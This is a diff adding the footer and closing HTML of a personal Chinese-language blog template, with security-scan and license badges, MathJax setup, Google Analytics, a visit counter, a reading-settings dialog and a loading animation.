+            <a href="http://webscan.360.cn/index/checkwebsite/url/www.meng.uno"><img border="0" height=27px width=74px src="/css/images/webscan.png"/></a>
+            <!-- <img border="0" height=27px width=109px style="background-color:white;"src="/css/images/kaba.png"/> -->
+            <a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" height=27px style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a>
+            <script type="text/javascript">
+              var locationUrl = escape(document.location.href);
+              document.write(unescape("%3Cscript") + " height='27px' width='74px' charset='utf-8' src='http://union.rising.com.cn//InfoManage/TrojanInspect.aspx?p1=XNk3xHG5v8uxFHYb4KaGpnyWjJlbHp7K&p2=RqCQt7iMKRw=&p3=XNk3xHG5v8vv3Z1xqd/V8w==&url=" + locationUrl + "' type='text/javascript'" + unescape("%3E%3C/script%3E"));
+            </script>
+          </div>
+
+        </div>
+      </footer>
+
+
+      <!-- min height -->
+
+      <script>
+        var wrapdiv = document.getElementById("wrap");
+        var contentdiv = document.getElementById("content");
+        var allheader = document.getElementById("allheader");
+
+        wrapdiv.style.minHeight = document.body.offsetHeight + "px";
+        if (allheader != null) {
+          contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+        } else {
+          contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
+        }
+      </script>
+
+      <script>
+        (function() {
+          var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?5d3bca9f7d6a95532f3ebb56e3c6bf11" : "https://jspassport.ssl.qhimg.com/11.0.1.js?5d3bca9f7d6a95532f3ebb56e3c6bf11";
+          document.write('<script src="' + src + '" id="sozz"><\/script>');
+        })();
+      </script>
+    </div>
+    <!-- <nav id="mobile-nav">
+
+  <a href="http://home.meng.uno" class="mobile-nav-link">Home</a>
+
+  <a href="http://articles.meng.uno" class="mobile-nav-link">Archives</a>
+
+  <a href="http://categories.meng.uno" class="mobile-nav-link">Categories</a>
+
+  <a href="http://tags.meng.uno" class="mobile-nav-link">Tags</a>
+
+  <a href="http://about.meng.uno" class="mobile-nav-link">About</a>
+
+  <a href="http://comments.meng.uno" class="mobile-nav-link">Comments</a>
+
+</nav> -->
+    <!-- mathjax config similar to math.stackexchange -->
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({ tex2jax: { inlineMath: [ ['$','$'], ["\\(","\\)"] ], processEscapes: true } });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({ tex2jax: { skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'] } });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() { var all = MathJax.Hub.getAllJax(), i; for(i=0; i
+      < all.length; i +=1 ) { all[i].SourceElement().parentNode.className +=' has-jax' ; } }); </script>
+
+        <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+        </script>
+
+
+        <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+        <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+        <script src="/js/scripts.js"></script>
+
+
+
+
+        <script src="/js/dialog.js"></script>
+
+
+        <!-- Google Analytics -->
+        <script type="text/javascript">
+          (function(i, s, o, g, r, a, m) {
+            i['GoogleAnalyticsObject'] = r;
+            i[r] = i[r] || function() {
+              (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date();
+            a = s.createElement(o),
+              m = s.getElementsByTagName(o)[0];
+            a.async = 1;
+            a.src = g;
+            m.parentNode.insertBefore(a, m)
+          })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
+
+          ga('create', 'UA-113947925-1', 'auto');
+          ga('send', 'pageview');
+        </script>
+        <!-- End Google Analytics -->
+
+
+        <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+        </script>
+  </div>
+
+  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h2 class="modal-title" id="myModalLabel">设置</h2>
+        </div>
+        <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+        <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+        <div class="modal-body">
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
+              正文字号大小
+            </a>
+          </div>
+          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
+            <div class="panel-body">
+              您已调整页面字体大小
+            </div>
+          </div>
+          <div style="margin:6px;">
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
+              夜间护眼模式
+            </a>
+          </div>
+          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
+            <div class="panel-body">
+              夜间模式已经开启，再次单击按钮即可关闭
+            </div>
+          </div>
+
+          <div>
+            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+          </div>
+          <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
+            <div class="panel-body">
+              欢迎来到匡盟盟的博客！
+            </div>
+            <div class="panel-body">
+              A second year MPhil candidate in CS at HKU
+            </div>
+            <div class="panel-body">
+              © 2020 Mengmeng Kuang All Rights Reserved.
+            </div>
+          </div>
+        </div>
+
+
+        <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
+        <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
+        <div class="modal-footer">
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+
+  <a id="menu-switch"><i class="fa fa-bars fa-lg"></i></a>
+
+
+
+</body>
+<style>
+  .test-div {
+    width: 300px;
+    height: 300px;
+    margin: 20px auto;
+    border: 1px solid #aaa;
+    position: relative;
+  }
+</style>
+
+<script src="/js/loading.js"></script>
+<script>
+  function loading7() {
+    $('body').loading({
+      loadingWidth: 240,
+      title: '请稍等!',
+      name: 'test',
+      discription: '精彩马上就来...',
+      direction: 'row',
+      type: 'origin',
+      originBg: '#71EA71',
+      originDivWidth: 30,
+      originDivHeight: 30,
+      originWidth: 4,
+      originHeight: 4,
+      smallLoading: false,
+      titleColor: '#388E7A',
+      loadingBg: '#312923',
+      loadingMaskBg: 'rgba(22,22,22,0.2)'
+    });
+    setTimeout(function() {
+      removeLoading('test');
+    }, 1000);
+  }
+</script>
+
+</html>
